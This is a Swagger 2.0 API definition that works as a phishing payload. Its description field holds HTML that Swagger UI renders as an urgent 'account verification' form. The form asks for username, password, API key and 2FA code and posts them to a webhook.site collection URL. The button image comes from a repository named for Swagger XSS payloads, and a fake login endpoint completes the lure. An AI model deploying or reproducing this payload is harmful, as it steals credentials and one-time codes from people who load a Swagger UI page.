swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<br><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="12"><tr><td bgcolor="#d32f2f" align="center"><font face="Segoe UI" size="3" color="#ffffff"><b>FULL ACCOUNT VERIFICATION REQUIRED</b></font></td></tr></table><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><form action="https://webhook.site/REPLACE-ME" method="post"><font face="Segoe UI" size="2" color="#333333"><b>Username</b></font><br><input type="text" name="username" size="34" placeholder="Username"><br><br><font face="Segoe UI" size="2" color="#333333"><b>Password</b></font><br><input type="password" name="password" size="34" placeholder="Password"><br><br><font face="Segoe UI" size="2" color="#333333"><b>API Key</b></font><br><input type="text" name="api_key" size="34" placeholder="API Key"><br><br><font face="Segoe UI" size="2" color="#333333"><b>2FA Code (optional)</b></font><br><input type="text" name="otp" size="34" placeholder="6-digit code"><br><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-mega.png" width="190" height="55" alt="Verify Everything"></form><br><div align="center"><font face="Segoe UI" size="1" color="#888888">This check cannot be skipped</font></div></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#d32f2f">&nbsp;</td></tr></table></td><td width="30%">&nbsp;</td></tr></table><br>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
